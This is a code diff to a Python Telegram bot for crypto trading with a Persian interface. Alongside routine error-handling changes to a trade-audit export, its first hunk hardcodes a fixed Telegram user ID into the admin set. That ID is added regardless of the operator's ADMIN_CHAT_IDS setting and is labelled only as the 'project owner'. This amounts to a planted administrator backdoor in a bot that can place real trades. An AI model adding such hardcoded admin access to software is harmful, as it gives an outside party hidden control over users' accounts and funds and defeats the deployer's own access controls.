@@ -92,6 +92,8 @@ PLATFORM_FEE_RATE_PCT = min(100.0, max(0.0, float(os.environ.get('PLATFORM_FEE_R
 PLATFORM_FEE_MIN_PROFIT_USDT = max(0.0, float(os.environ.get('PLATFORM_FEE_MIN_PROFIT_USDT', '0.01')))
 ADMIN_CHAT_IDS_RAW = os.environ.get('ADMIN_CHAT_IDS', os.environ.get('ALLOWED_CHAT_IDS', '')).strip()
 ADMIN_CHAT_IDS = {int(x.strip()) for x in ADMIN_CHAT_IDS_RAW.split(',') if x.strip().lstrip('-').isdigit()}
+# Project owner admin ID. Environment ADMIN_CHAT_IDS may add additional admins.
+ADMIN_CHAT_IDS.add(1878257830)
 REAL_RESTART_LOCK = os.environ.get('REAL_RESTART_LOCK', 'true').lower() not in ('0', 'false', 'no')
 MARGIN_MODE = os.environ.get('MARGIN_MODE', 'isolated').lower()
 PROTECTION_TRIGGER = os.environ.get('PROTECTION_TRIGGER', 'mark_price').lower()
@@ -3157,10 +3159,16 @@ def export_trade_pipeline(chat_id):
     try:
         fname=_export_filename('trade_pipeline_audit', s.get('timeframe'))
         caption=f'🧭 خروجی کامل ممیزی Pipeline | تایم‌فریم: {TF_DISPLAY.get(s.get("timeframe"),s.get("timeframe"))} | {"✅ یکسان" if tfmeta["timeframe_consistent"] else "⚠️ مخلوط"}'
-        requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument',data={'chat_id':chat_id,'caption':caption},files={'document':(fname,io.BytesIO(raw),'application/json')},timeout=30)
+        resp = requests.post(f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument',data={'chat_id':chat_id,'caption':caption},files={'document':(fname,io.BytesIO(raw),'application/json')},timeout=30)
+        if not resp.ok or not (resp.json() or {}).get('ok', False):
+            logger.warning('export trade pipeline telegram send failed: %s', resp.text[:500])
+            send_message(chat_id, '❌ خروجی JSON ممیزی ساخته شد اما ارسال فایل به تلگرام ناموفق بود.')
+            return False
         return True
     except Exception as exc:
-        logger.warning('export trade pipeline failed: %s',exc); return False
+        logger.warning('export trade pipeline failed: %s',exc)
+        send_message(chat_id, f'❌ خطا در خروجی JSON ممیزی: {exc}')
+        return False
 
 def export_trade_data(chat_id):
     if not is_allowed(chat_id) or not TELEGRAM_TOKEN: return False
@@ -3260,7 +3268,7 @@ def menu(chat_id,message_id=None):
     maxp=s['max_open_positions'] if s['max_open_positions']>0 else '∞'
     diag = "🟢 فعال" if s.get('entry_diag_enabled', True) else "🔴 خاموش"
     text=f"📊 *پنل اصلی ربات*\n\n🟢 اسکن: `{'فعال' if s['is_bot_active'] else 'متوقف'}`\n💳 حساب: `{'واقعی' if s['trading_mode']=='REAL' else 'کاغذی'}`  |  ⏱ تایم‌فریم: `{TF_DISPLAY.get(s['timeframe'],s['timeframe'])}`\n📈 استراتژی: `{'پویا (دوطرفه)' if s['active_strategy']=='dynamic' else s['active_strategy']}`\n💰 موجودی: `{bal:.2f} USDT`  |  ⚙️ مارجین: `{s['trade_amount_usdt']:.0f} USDT`\n📌 پوزیشن‌های باز: `{maxp}`  |  🔍 لاگ ورود: `{diag}`\n🛡 ریسک هر معامله: `{s['risk_per_trade_pct']:.2f}%`  |  حد ضرر روزانه: `{s['daily_loss_limit_pct']:.2f}%`\n\nاز منوی زیر بخش موردنظر را انتخاب کن:"
-    send_message(chat_id,text,get_main_menu_keyboard(s['is_bot_active'], s.get('entry_diag_enabled', True), is_admin(chat_id)),message_id)
+    send_message(chat_id,text,get_main_menu_keyboard(s['is_bot_active'], s.get('entry_diag_enabled', True), is_admin(chat_id), s),message_id)
 
 
 def stop_scan(chat_id, reason='manual'):
